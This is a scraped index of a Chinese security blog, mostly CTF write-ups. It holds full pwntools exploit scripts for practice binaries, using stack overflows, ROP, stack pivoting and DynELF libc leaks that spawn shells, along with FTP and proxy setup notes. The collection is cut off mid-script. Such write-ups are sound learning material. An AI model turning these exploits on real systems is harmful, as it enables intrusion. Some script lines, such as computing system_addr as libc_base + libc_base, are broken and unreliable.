在采用本地用户模式登录FTP服务器后，默认访问的是该用户的家目录，也就是说，访问的是/home/linuxprobe目录(系统创建的用户，在home文件夹下都有对应用户名的文件夹)。而且该目录的默认所有者、所属组都是该用户自己，因此不存在写入权限不足的情况。如果读写权限没给，手动设定，给读写权限。 采用非本地用户模式登录，与采用本地用户模式的区别是：采用非本地用户模式可以指定FTP文件夹。￼￼￼￼￼￼￼","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"安恒抗疫赛","slug":"安恒抗疫赛","date":"2020-02-29T04:12:59.000Z","updated":"2020-03-12T15:11:14.000Z","comments":true,"path":"2020/02/29/安恒抗疫赛/","link":"","permalink":"http://chumen77.xyz/2020/02/29/安恒抗疫赛/","excerpt":"","text":"安恒抗疫赛很简单的比赛，题也不多，记录一下做的2道简单的Re。 re1_pyc拿到的是一个pyc文件。直接拿到网站上反编译一下： #!/usr/bin/env python # encoding: utf-8 import base64 import string def caser(flag): enc1 = &#39;&#39; for i in flag: enc1 += chr(ord(i) - 5) return enc1 def rail(flag): p1 = &#39;&#39; p2 = &#39;&#39; p3 = &#39;&#39; enc2 = &#39;&#39; for i in range(len(flag)): j = i % 3 if j == 0: p1 += flag[i] continue if j == 1: p2 += flag[i] continue p3 += flag[i] enc2 = p1 + p2 + p3 return enc2 def rep(flag): table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39; table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39; table = string.maketrans(table1, table2) return flag.translate(table, &#39;=&#39;) while True: flag = raw_input(&#39;please input flag to check:&#39;) if rep(base64.b64encode(rail(caser(flag)))) == &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39;: print &#39;Success!you got it!&#39; break continue print &#39;try a gain&#39; 逻辑挺简单的，直接拿着这个代码改下： #!/usr/bin/env python # encoding: utf-8 import base64 import string def caser(flag): enc1 = &#39;&#39; for i in flag: enc1 += chr(ord(i) + 5) return enc1 def rail(flag): p1 = &#39;&#39; p2 = &#39;&#39; p3 = &#39;&#39; enc2 = &#39;&#39; j = 0 x = 25 for i in range(x): j = i + 13 z = j + 13 p3 += flag[i] + flag[j] if z &gt;= 38 : break p3 += flag[z] enc2 = p1 + p2 + p3 return enc2 def rep(flag): table1 = &#39;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39; table2 = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39; table = string.maketrans(table1, table2) return flag.translate(table, &#39;=&#39;) key = &#39;ywjCytmRxI9CycWZngD2ncTDkZqYlJrGmhHCxISUnfWSlgfDlJi&#39; flag = rail(caser(base64.b64decode(rep(key) + &#39;=&#39;))) print(flag) maze1一个简单的maze问题，不过是c++写的，ida反编译看起来有点难读。 ida分析从这里确定下地图，后面的2就是终点。去内存中取出来地图：去ida继续分析：发现你输入的字符串需要等于10，如果不是直接就失败，长度等于10才继续判断。awsd还是这几个字符控制方向。再联系一下前面的地图，终点是2，只能走10步，猜一波dddddsssss。就是这个，flag就是去md5加密一下出来的字符串。","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"记录i春秋新春公益赛的两个题","slug":"记录i春秋新春公益赛的两个题","date":"2020-02-25T08:55:25.000Z","updated":"2020-03-12T15:12:27.000Z","comments":true,"path":"2020/02/25/记录i春秋新春公益赛的两个题/","link":"","permalink":"http://chumen77.xyz/2020/02/25/记录i春秋新春公益赛的两个题/","excerpt":"","text":"记录i春秋新春公益赛的两个题吃鸡神器这个题目是比赛时没做，因为有一段时间没做re题目了，下来看到这个题做出的人不算少，就去尝试做一做。源程序是qt写的，以前听室友说过qt的程序ida是静态分析不了的，函数调用太多了，就直接动态分析。这个题目应该是有多线程od打开直接是黑屏的，左下角显示新建了一个线程，第一次做这种题也比较没有头绪。折腾了一会发现用的x64dbg可以调试了。 x64dbg调试一直运行程序等代码跑到0x40开头的段，进入login 的模块。找下字符串：￼在这里下个断点。因为登陆失败会跳转输出这个字符串的函数，看看能不能查看出是从哪里跳转过来的然后在密码判断那里来继续分析。看到已经跳转过来了，但是发现附近没有什么判断的地方，去根据那个从哪里跳转过来，追过去看到登陆成功调用welcome的函数，但是也没有发现什么可以利用的那里的判断不是要找的密码判断。换个思路，还是跳转到失败那里，但是在上层函数的栈中，因为存在判断登陆的用户跟密码，应该会存在我们输入的东西，寻找一下密码跟用户名。找到了，给用户名对应的地址下一个硬件断点，来看看哪里会访问这里，只要访问了基本距离要找的函数差不远了。其中第二个字符对应处，经测试不应该下断点。一直让其F9运行，等到了用户0x40段代码：发现这段是在一个个字符处理lubenwei字符串，还有ret，这样基本就是了。ret以后到：注意此处的汇编语句，并看下寄存器情况： 刚刚走过call函数，下面且有cmp对比语句，并且发现了输入的密码12345678，十分可疑了。在这几处函数下断点，重新点击login验证进行分析，发现的确断在了下的这几个函数，结合寄存器查看发现，输入的密码跟走过0x004021D3这个函数后传过来的eax进行对比。并且一对比以后就进入了，提示登陆失败的地方。所以这个eax就是用户的密码了。测试以后发现是小写的eax 41D26F00 ：41d26f00,输入密码：Ok,成功了。 borrowstack这个题目名字就是borrowshack 接栈。含义就是转移栈，正好最近刚学过，就动手去做了，结果卡了很久，但也学到很多，此前练习的栈迁移题目没有这题的情况。 查保护和arch[*] &#39;/media/psf/mypwn2/xcgys/borrowstack&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) ida分析int __cdecl main(int argc, const char **argv, const char **envp) { char buf; // [rsp+0h] [rbp-60h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(&amp;s); read(0, &amp;buf, 0x70uLL); puts(&quot;Done!You can check and use your borrow stack now!&quot;); read(0, &amp;bank, 0x100uLL); return 0; } 代码是很简单的，bank的地址在bss段，以后留着做栈迁移就可以了 。溢出地址还是只可以控制ebp，跟retadress。接下来就是自己学到的了，自己手动调试了一段时间才发现的。 坑点（学到的新东西）先说下这个程序的情况：bank 的地址 .bss:0000000000601080注意看下bss段里got段的距离，一共是40个字节，是比较近的。如果按我以前的做法直接迁移到bank这地址做新栈，当栈迁移过去以后，使用puts函数来泄露某个函数got对应的地址时，会发现当调用puts以后，会进入libc中开始一连串的函数调用：第一个发现还没有push，此时rsp就是bank的地址了，push过后肯定栈指针开始慢慢变小，往bss段上方延伸。当调用第二个函数：发现已经到了bss上方的got表段，这样毫无疑问，里面的值就会改动了，程序接下来发生什么是很难预测的，并且个人也拿不到原本的got地址，从而算出libc基地址。并且会发现，当以往回到start处清理栈想再次利用漏洞的时候，也是不行了，也是因为不知道什么数据被改动，造成了影响。 解决办法就是把栈迁移到bss段的尽量靠后，这样就会尽量不影响到got表和原本正常的数据。返回地址不再是自己常常用的start处，换成其他合适的地方。 expfrom pwn import * from LibcSearcher import * import time context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io = process(&#39;./borrowstack&#39;) # io = remote(&#39;123.56.85.29&#39;,3635) elf = ELF(&#39;./borrowstack&#39;) # libc = elf.libc leave_addr = 0x0400699 offset = 200 buf_addr = 0x000601080 padding = 0x60 start_addr = 0x0400626 p = &#39;\\x00&#39;* padding + p64(buf_addr+offset) + p64(leave_addr) pop_rsi_rx_ret = 0x400701 io.recvuntil(&#39;want\\n&#39;) raw_input(&#39;-&gt;&#39;) io.send(p) io.recvuntil(&#39;stack now!\\n&#39;) libc_start_main = elf.got[&#39;__libc_start_main&#39;] puts_plt = elf.symbols[&#39;puts&#39;] puts_got = elf.got[&#39;puts&#39;] pop_rdi_ret = 0x400703 read_got = elf.got[&#39;read&#39;] p = flat([&#39;b&#39;*offset,(buf_addr+offset),pop_rdi_ret,puts_got,puts_plt,start_addr]) raw_input(&#39;-&gt;&#39;) io.sendline(p) puts_add = u64((io.recv(6)).ljust(8,&#39;\\x00&#39;)) print(hex(puts_add)) obj = LibcSearcher(&#39;puts&#39;,puts_add) libc_base = puts_add - obj.dump(&#39;puts&#39;) print(hex(libc_base)) sleep(0.1) rec = libc_base + 0x4526a system_addr = libc_base + libc_base binsh_addr = libc_base + libc_base print(hex(system_addr)) print(hex(binsh_addr)) io.recvline() io.recvuntil(&#39;want\\n&#39;) p = &#39;\\x00&#39;* padding + p64(1) + p64(rec) io.send(p) io.interactive() 结论和收获结论：当栈迁移到bss段以后，由于libc函数的调用，此时栈慢慢增高，bss段以上的数据也可能会被改动。收获：当再遇到栈迁移问题的时候，要注意bss段与got的距离，返回地址写入start地址，发现出现问题的时候，就该提升栈迁移的地址高度，和找个合适的返回位置，再次利用漏洞。","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"XCTF\\_pwn新手","slug":"XCTF_pwn新手","date":"2020-02-17T12:42:23.000Z","updated":"2020-02-28T09:12:25.000Z","comments":true,"path":"2020/02/17/XCTF_pwn新手/","link":"","permalink":"http://chumen77.xyz/2020/02/17/XCTF_pwn新手/","excerpt":"","text":"XCTF_pwn新手cgpwn2查保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析漏洞就在这s处，gets可以无限读取，导致栈溢出。 攻击思路 第一个fgets获取时候，读取一个/bin/sh\\x00进去，因为name的地址是固定的。 get函数获取时候，padding + system_plt +name地址即可。 expfrom pwn import * context.log_level = &#39;debug&#39; # io = process(&#39;./cgpwn2&#39;) io = remote(&#39;111.198.29.45&#39;,40540) elf = ELF(&#39;./cgpwn2&#39;) io.recvuntil(&#39;name\\n&#39;) raw_input(&#39;-&gt;&#39;) io.sendline(&#39;/bin/sh\\x00&#39;) system_plt = elf.symbols[&#39;system&#39;] padding = 0x26 + 4 binsh_add = 0x0804A080 payload = padding * &#39;a&#39; + p32(system_plt) + p32(0x0804A080) + p32(binsh_add) raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"WP","slug":"WP","permalink":"http://chumen77.xyz/tags/WP/"}]},{"title":"利用DynElf模块完成获取libc信息","slug":"利用DynElf模块完成获取libc信息","date":"2020-02-15T08:54:53.000Z","updated":"2020-02-28T07:49:41.000Z","comments":true,"path":"2020/02/15/利用DynElf模块完成获取libc信息/","link":"","permalink":"http://chumen77.xyz/2020/02/15/利用DynElf模块完成获取libc信息/","excerpt":"","text":"利用DynElf模块完成获取libc信息前言记录一下另一种没有libc，完成漏洞利用的办法，学完后自我感觉这个办法已经比较落后了，没有libcseacher好用，也用起来比它难的多了。针对于libcseacher不能做的题，用这种办法，否则还是libcseacher好用。 Dynelf解析加载的、动态链接的ELF⼆进制⽂件中的符号。给定⼀个可以在任意地址泄漏数据的函数，任何加载的 库中的任何符号都可以被解析。（官方文档解释） 基本使用框架：io = remote(ip, port) def leak(addr): payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot; io.send(payload) data = io.recv() #debug用的 print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;))) return data #初始化DynELF模块 d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject) system_addr = d.lookup(“system”, &#39;libc&#39;)其中第2个参数，可以不传。进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，addr就是leak函数要泄漏信息的所在地址。正是这个addr的参数的存在，才让Dynelf函数在内存中到处的leak以及对比是否是我们寻找的sympols。 且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几 个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等。 使用条件：不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件： 目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内； 目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。 以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。 使用write函数来泄露write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。 其输出完全由其参数len决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\\0’, ‘\\n’之类的字符影响。因此leak函数中对数据的读取和处理较为简单。但是其一个不好的地方，就是需要传递3个参数，在面对64位程序的时候，其中rdx这个寄存器是比较难处理的。就不得不用万能gadget了。 万能gadget这个是libc_init函数的汇编，这个函数是一定要调用的，并且可以控制rdi,rsi,rdx,所以能称的上万能gadget。对于使用这段gadget，首先在初识函数的ret处填入如图所指的pop rbx的地址，然后看下栈如何来布置：（其中为什么填入got地址，是因为接下来ret到mov rdx,r13后面的call qword ptr[r12+rbx*8] 其是call这个地址的。）在第一段pop 后ret地址要填入mov rdx,r13的地址，然后再慢慢执行，当执行完成call以后，流程还会回到这一段所以我们为了再次利用最后那个retn，ret到自己想去的地方，要在栈上摆好7*8=56个字节。接下来练习关于write两个题目。 PlaidCTF 2013 ropasaurusrex查保护和arch Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析ssize_t sub_80483F4() { char buf; // [esp+10h] [ebp-88h] return read(0, &amp;buf, 0x100u); }函数十分简单，溢出在这个位置。并且plt里面有write函数，然后就用它来泄露。 expfrom pwn import * io = process(&#39;./ropasaurusrex&#39;) elf = ELF(&#39;./ropasaurusrex&#39;) buf = 0x8049620 padding = 140 write_add = elf.symbols[&#39;write&#39;] start_addr = 0x08048340 def leak(addr): p = &#39;&#39; p += padding * &#39;a&#39; p += p32(write_add) p += p32(start_addr) p += p32(1) p += p32(addr) p += p32(0x4) io.sendline(p) content = io.recv(4) # print(&quot;%x -&gt; %s&quot; %(addr, (content or &#39;&#39;).encode(&#39;hex&#39;))) return content d = DynELF(leak,elf=elf) system_add = d.lookup(&#39;system&#39;,&#39;libc&#39;) read_add = d.lookup(&#39;read&#39;,&#39;libc&#39;) log.info(&quot;system_add = %x&quot;, system_add) log.info(&quot;read_add = %x&quot;, read_add) p = padding * &#39;a&#39; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8) io.sendline(p) io.sendline(&#39;/bin/sh\\x00&#39;) io.interactive()Jarvis_oj_leave4查保护和arch[*] &#39;/media/psf/mypwn2/jarvis_OJ/level4/level4&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)ida分析 ssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] return read(0, &amp;buf, 0x100u); }漏洞函数，存在栈溢出。还是跟上题一样的思路。 expfrom pwn import * import time # context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; # io = process(&#39;./level4&#39;) io = remote(&#39;pwn2.jarvisoj.com&#39;,9880) elf = ELF(&#39;./level4&#39;) __libc_start_main_got = elf.got[&#39;__libc_start_main&#39;] write_plt = elf.symbols[&#39;write&#39;] start_addr = 0x08048350 padding = 140 def leak(addr): payload = padding * &#39;a&#39; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4) io.sendline(payload) data = io.recv(4) print(&quot;%x -&gt; %s&quot; %(addr, (data or &#39;&#39;).encode(&#39;hex&#39;))) return data d = DynELF(leak,elf = elf) system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;) info(&#39;system_addr = %#x&#39; %system_addr) read_addr = d.lookup(&#39;read&#39;,&#39;libc&#39;) info(&#39;read_addr = %#x&#39; %read_addr) binsh_add = 0x804A01C payload = padding * &#39;a&#39; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8) io.sendline(payload) sleep(0.1) io.sendline(&#39;/bin/sh\\x00&#39;) io.interactive()使用puts函数来泄露printf, puts这类函数的特点是会被特殊字符影响，puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。 针对缺点的改进办法puts输出完后就没有其他输出leak函数模板 def leak(address): count = 0 content = ‘’ payload = xxx p.send(payload) print p.recvuntil(‘xxxn’) #一定要在puts前释放完输出 up = “” while True: c = p.recv(numb=1, timeout=0.1) count += 1 if up == ‘\\n’ and c == “”: #接收到的上一个字符为回车符，而当前接收不到新字符，则 content += content[:-1] +’\\x00’ #删除puts函数输出的末尾回车符 break else: content += c up = c content = content[:4] #取指定字节数 log.info(“%#x =&gt; %s” % (address, (content or ‘’).encode(‘hex’))) return content其中c = p.recv(numb=1, timeout=0.1)由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待0.1秒钟，如果确实接收不到了，就说明输出结束了。以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串”” puts输出完后还有其他输出def leak(address): count = 0 content = &quot;&quot; payload = xxx p.send(payload) print p.recvuntil(&quot;xxxn&quot;)) #一定要在puts前释放完输出 up = &quot;&quot; while True: c = p.recv(1) count += 1 if up == &#39;\\n&#39; and c == &quot;x&quot;: #一定要找到泄漏信息的字符串特征 content = content[:-1] + &quot;x00&quot; break else: content += c up = c content = content[:4] log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &#39;&#39;).encode(&#39;hex&#39;))) return contentLctf_2016_pwn100查保护和arch[*] &#39;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)ida分析int sub_40068E() { char v1; // [rsp+0h] [rbp-40h] sub_40063D((__int64)&amp;v1, 200); return puts(&quot;bye~&quot;); } __int64 __fastcall sub_40063D(__int64 a1, signed int a2) { __int64 result; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = (unsigned int)i; if ( i &gt;= a2 ) break; read(0, (void *)(i + a1), 1uLL); } return result; }主要的漏洞函数在这两个。这二个函数结合起来引起栈溢出，第二个函数还对读入数据做了处理，我们要保证送过去200的个自己，注意要用send发。 因为其有puts函数，这次就用puts函数来进行leak。等leak出来以后，返回start清理栈，再用dynelf找出system，和read函数的地址。 第二次构造rop链的时候，用read函数读system(/bin/sh)到一个确定的地址，还是会到start处。 第三次构造时候，直接进行调用system函数的rop链即可。 其中对于read这个函数，rdx这个参数就得用万能gadget来控制了。 exp#coding:utf-8 from pwn import * context.arch = &#39;amd64&#39; # context.log_level = &#39;info&#39; io = process(&#39;./pwn100&#39;) elf = ELF(&#39;./pwn100&#39;) # libc = elf.libc padding = 72 puts_plt = elf.plt[&#39;puts&#39;] read_got = elf.got[&#39;read&#39;] start_add = 0x000400550 pop_rdi = 0x400763 def leak(addr): payload = padding * &#39;a&#39; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)] payload = payload.ljust(200,&#39;b&#39;) io.send(payload) count = 0 up = &#39;&#39; content = &#39;&#39; io.recvuntil(&#39;bye~\\n&#39;) #一定要在puts前释放完输出 while True: c = io.recv(numb=1, timeout=0.1) count += 1 if up == &#39;\\n&#39; and c == &quot;&quot;: #接收到的上一个字符为回车符，而当前接收不到新字符，则 content = content[:-1] +&#39;\\x00&#39; #删除puts函数输出的末尾回车符 break content += c else: up = c content = content[:4] #取指定字节数 log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &#39;&#39;).encode(&#39;hex&#39;))) return content d = DynELF(leak, elf = elf) system_addr = d.lookup(&#39;system&#39;,&#39;libc&#39;) log.info(&#39;system_addr = %#x&#39; %system_addr) binsh_addr = 0x601068 - 8 payload = padding * &#39;a&#39; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&#39;\\x00&#39;*56,start_add]) payload = payload.ljust(200,&#39;b&#39;) io.send(payload) io.recvuntil(&#39;bye~\\n&#39;) io.send(&#39;/bin/sh\\x00&#39;) payload = padding * &#39;a&#39; + flat([pop_rdi,binsh_addr,system_addr]) payload = payload.ljust(200,&#39;b&#39;) io.send(payload) io.interactive()其他获取libc的方法虽然DynELF是一个dump利器，但是如果写不出来leak函数，下libc被墙等等。就用这两个网站：http://libcdb.com/https://libc.blukat.me/都是只有有两个泄露地址，就可以查到对应的libc版本，并且可以给出其原件，接着就可以进行其他操作。 还有在比赛过程中，如果一个题目不好获取到libc，那么可以看看其他题目的libc，有可能这个赛事平台服务器都是这个版本。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"linux下clash的使用","slug":"linux下clash的使用","date":"2020-02-14T15:27:09.000Z","updated":"2020-02-28T07:49:58.000Z","comments":true,"path":"2020/02/14/linux下clash的使用/","link":"","permalink":"http://chumen77.xyz/2020/02/14/linux下clash的使用/","excerpt":"","text":"linux下clash的使用前言本文只是很简单记录一下，自己如何使用clash的。因为发现终端虽说在本机上已经开了代理，但是终端执行命令下载东西的时候十分的卡，今天才了解到，原来终端的代理是另外开的。所以就开始折腾一下，linux下clash的使用（本人用了很久了clash，所以直接看这个软件了）。 0x01执行cd &amp;&amp; mkdir clash 在用户目录下创建 clash 文件夹。下载适合的 Clash 二进制文件并解压重命名为 clash,一般个人的64位电脑下载 clash-linux-amd64.tar.gz 即可。地址：https://github.com/Dreamacro/clash/releases 0x02在终端cd到Clash二进制文件所在的目录,把Clash 配置文件给移进去。配置文件的名称要是config.yaml 我是直接创建了这个文件，并写入的自己的配置，因为mac本机一直用这个软件，然后在配置文件找到主使用那个，直接复制那个自己使用代理网站加载下来的配置给config.yaml。 0x03chmod +x ./clash加执行权限执行 ./clash -d . 即可启动 Clash，同时启动 HTTP 代理和 Socks5 代理。然后进入这个http://clash.razord.top/ 链接可以对代理进行个简单管理 0x04打开系统设置，选择网络，点击网络代理右边的 ⚙ 按钮，选择手动，填写 HTTP 和 HTTPS 代理为 127.0.0.1:7890，填写 Socks 主机为 127.0.0.1:7891，即可启用系统代理。 0x05终端开启代理export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891执行这个命令即可。出现这个就是代理成功了，然后就会发现终端下载东西的神速。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"Stack Migration题目练习","slug":"Stack Migration题目练习","date":"2020-02-11T13:51:48.000Z","updated":"2020-02-28T07:51:31.000Z","comments":true,"path":"2020/02/11/Stack Migration题目练习/","link":"","permalink":"http://chumen77.xyz/2020/02/11/Stack Migration题目练习/","excerpt":"","text":"Stack Migration题目练习前言记录几道Stack Migration的练习题。 pwnable_simple_login查看保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 32位程序，开了nx和Canary保护。 ida分析int __cdecl main(int argc, const char **argv, const char **envp) { int de_s; // [esp+18h] [ebp-28h] char s; // [esp+1Eh] [ebp-22h] unsigned int de_length; // [esp+3Ch] [ebp-4h] memset(&amp;s, 0, 0x1Eu); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); printf(&quot;Authenticate : &quot;); _isoc99_scanf(&quot;%30s&quot;, &amp;s); memset(&amp;input, 0, 0xCu); de_s = 0; de_length = Base64Decode((int)&amp;s, &amp;de_s); // v6 = 解码后的长度 if ( de_length &gt; 0xC ) { puts(&quot;Wrong Length&quot;); } else { memcpy(&amp;input, de_s, de_length); // 执行完，把解码后的字段，放入input的bss内存上 if ( auth(de_length) == 1 ) correct(); } return 0; } （其中已经改了部分变量的名称方便读代码）流程就是接受一段base64编码过的字符串，然后进行一下解码，解码返回长度给变量，且做与12大小的比较，如果解码后大于12，就直接退出程序，并且解码的字符串是放在input的这个全局变量里：接着进入auth函数分析一下： _BOOL4 __cdecl auth(int length) { char v2; // [esp+14h] [ebp-14h] char *s2; // [esp+1Ch] [ebp-Ch] int v4; // [esp+20h] [ebp-8h] memcpy(&amp;v4, &amp;input, length); s2 = (char *)calc_md5((int)&amp;v2, 12); printf(&quot;hash : %s\\n&quot;, s2); return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0; } 可以发现其是一个md5加密后，然后跟后面那串字符串对比。并且看一下v4变量：发现memcpy这个函数会引起栈溢出，但是可控的只是12-8 = 4字节。然后输入12位‘1’，编码后放入程序，发现最后的4个字节被放入了ebp，正好这下就可以控制ebp了。接着就有了攻击思路： 攻击思路控制好这个ebp，然后由于这个程序中，auth函数最后有一个leave ret 的gadget，main函数也有一个，正好满足我们来Stack Migration。在栈上摆放的结构为：到时候由于memcpy会复制这个老栈的前12个字节的数据，然后new esp指向的是固定位置input。然后两个leave gadget即可 EXPfrom pwn import * from base64 import * # io = process(&#39;./login&#39;) io = remote(&#39;node3.buuoj.cn&#39;,29026) system_add = 0x08049284 buf = 0x0811EB40 io.recvuntil(&#39;e : &#39;) p = &#39;aaaa&#39; + p32(system_add) + p32(buf) io.sendline(b64encode(p)) io.interactive()安恒月赛_over.over查保护和arch[*] &#39;/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)64位，只开了nx ida分析__int64 __fastcall main(__int64 a1, char **a2, char **a3) { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); while ( sub_400676() ) ; return 0LL; }主函数十分简单，主要核心就在while包裹的函数: int sub_400676() { char buf; // [rsp+0h] [rbp-50h] memset(&amp;buf, 0, 0x50uLL); putchar(&#39;&gt;&#39;); read(0, &amp;buf, 0x60uLL); return puts(&amp;buf); }可以看到溢出可控自己只有8个字节，也就是一个gadget，明显需要Stack Migration，那么就得控制好ebp，padding即为0x50，但是这个题目没有给我们固定的地址，也就是没有全局变量可用，那就想办法看栈偏移了。 可以看到是read函数，和puts函数的搭配，当往里面塞0x50字节字符是不会添加上’\\x00’的: 然后用puts函数输出时会把ebp里面的值也会输出出来。这下栈偏移是固定的，就可以在read的时候往里面塞rop链，依靠偏移来跳上去执行就可以了。算一下main的ebp与现在的esp差距是112个字节。让ebp-112就等于esp指向了栈顶esp。 攻击思路先给程序0x50个字节，然后接收下main的ebp值。然后程序由于while循环再次，进入这个函数，这时候送rop链，第一个rop链可以先泄露下puts的内存地址，然后计算libc的地址，返回地址写成主函数start，清理下栈。然后第二次读的时候，送过去system(/bin/sh)的rop链即可。程序每次读，构造好rop链的时候，要保证送过去80字节，然后控制ebp 为栈顶esp，还有加上leave 的gadget，这下两个leave的gadget就让程序跳回栈头的下个8个字节，开始执行rop链。 expfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; io = process(&#39;./over.over&#39;) e = ELF(&#39;./over.over&#39;) l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) leave_ret = 0x004006be pop_rdi_ret = 0x0400793 put_got = e.got[&#39;puts&#39;] put_plt = e.symbols[&#39;puts&#39;] padding = 80 raw_input(&#39;-&gt;&#39;) io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80) # stack = u64(io.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, &#39;\\0&#39;)) - 0x70 stack = u64((io.recvline())[80:86].ljust(8,&#39;\\x00&#39;)) - 0x70 io.readuntil(&#39;&gt;&#39;) print(hex(stack)) p = flat([&#39;11111111&#39;,pop_rdi_ret,put_got,put_plt,0x000400580,(80-40)*&#39;1&#39;,stack,leave_ret]) raw_input(&#39;-&gt;&#39;) io.send(p) libc = u64(io.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, &#39;\\0&#39;)) - l.symbols[&#39;puts&#39;] print(hex(libc)) io.sendafter(&quot;&gt;&quot;, &#39;a&#39; * 80) stack = u64((io.recvline())[80:86].ljust(8,&#39;\\x00&#39;)) - 0x70 print(hex(stack)) io.readuntil(&#39;&gt;&#39;) system_add = libc + l.symbols[&#39;system&#39;] binsh_add = libc + l.search(&#39;/bin/sh\\x00&#39;).next() p = flat([&#39;22222222&#39;,pop_rdi_ret,binsh_add,system_add,(80-4*8)*&#39;2&#39;,stack,leave_ret]) io.send(p) io.interactive() HITCON_training_lab6源码#include &lt;stdio.h&gt; int count = 1337 ; char *t= &quot;Z\\xc3&quot; ; int main(){ if( count!=1337 ){ _exit(1); } count++ ; char buf[48]; setvbuf(stdout,0,2,0); puts(&quot;Try your best : &quot; ); read(0, buf,128); return ; } gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration 编译命令。然后就不分析了，前面练习64位时候写的那个博客已经记录很清楚了，这里只记录下exp。 expfrom pwn import * context.arch = &#39;i386&#39; context.log_level = &#39;debug&#39; # io = process(&#39;./migration&#39;) io = remote(&#39;127.0.0.1&#39;,4000) e = ELF(&#39;./migration&#39;) l = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;) padding = 40 puts_plt = 